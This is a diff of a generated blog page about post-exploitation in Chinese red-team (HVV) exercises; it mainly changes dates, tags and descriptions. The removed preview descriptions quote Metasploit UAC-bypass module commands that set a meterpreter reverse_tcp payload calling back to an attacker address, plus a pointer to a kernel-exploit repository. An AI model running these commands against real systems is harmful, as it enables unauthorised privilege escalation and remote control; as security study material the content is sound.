@@ -8,25 +8,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
     <title>hvv_后渗透 - Sc0fie1d</title><meta name="Description" content="sofield&#39;s blog"><meta property="og:title" content="hvv_后渗透" />
-<meta property="og:description" content="权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
-windows提权Windows常见权限分类：
-1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
-（权限为Administrator时大概率会成功，其他可能需要绕UAC）
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2." />
+<meta property="og:description" content="HVV专题&ndash;后渗透" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://scofield1920.github.io/hvv_post_penetration/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
-
-<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-11-17T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
 
 <meta name="twitter:title" content="hvv_后渗透"/>
-<meta name="twitter:description" content="权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
-windows提权Windows常见权限分类：
-1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
-（权限为Administrator时大概率会成功，其他可能需要绕UAC）
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2."/>
+<meta name="twitter:description" content="HVV专题&ndash;后渗透"/>
 <meta name="application-name" content="scofield-blog">
 <meta name="apple-mobile-web-app-title" content="scofield-blog">
 
@@ -42,8 +34,8 @@ windows提权Windows常见权限分类：
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/"
-        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "penetration, web, hvv","wordcount":  1638 ,
-        "url": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "hvv","wordcount":  1639 ,
+        "url": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-11-17T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -249,8 +241,8 @@ windows提权Windows常见权限分类：
     </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hvv_后渗透</h1><div class="post-meta">
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/penetration/"><i class="far fa-folder fa-fw"></i>penetration</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1638 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1639 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -360,7 +352,8 @@ windows提权Windows常见权限分类：
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="权限提升" class="headerLink">
+            </div><div class="content" id="content"><p>HVV专题&ndash;后渗透</p>
+<h2 id="权限提升" class="headerLink">
     <a href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87" class="header-mark"></a>权限提升</h2><p>通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。</p>
 <h3 id="windows提权" class="headerLink">
     <a href="#windows%e6%8f%90%e6%9d%83" class="header-mark"></a>windows提权</h3><p>Windows常见权限分类：</p>
@@ -1427,14 +1420,13 @@ web服务器：192.168.1.2
 <li>未授权访问漏洞</li>
 <li>域渗透相关漏洞</li>
 <li>虚拟机逃逸</li>
-</ul>
-</div>
+</ul></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 0001-01-01</span>
+                <span>Updated on 2023-11-17</span>
             </div>
             <div class="post-info-license"></div>
         </div>
@@ -1444,7 +1436,7 @@ web服务器：192.168.1.2
                     </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\hvv_post_penetration.md target="_blank" rel="noopener noreferrer">Edit this page</a>
                     </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20hvv_%E5%90%8E%E6%B8%97%E9%80%8F&body=|Field|Value|%0A|-|-|%0A|Title|hvv_%E5%90%8E%E6%B8%97%E9%80%8F|%0A|Url|http://scofield1920.github.io/hvv_post_penetration/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_post_penetration.md| target="_blank" rel="noopener noreferrer">Report issue</a>
                     </span></div>
-            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透" data-hashtags="penetration,web,hvv"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-hashtag="penetration"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透" data-hashtags="hvv"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-hashtag="hvv"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
         function shareOnMastodon(title, link) {
             const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
             const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
@@ -1465,7 +1457,7 @@ web服务器：192.168.1.2
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/penetration/">penetration</a>,&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/hvv/">hvv</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/hvv/">hvv</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
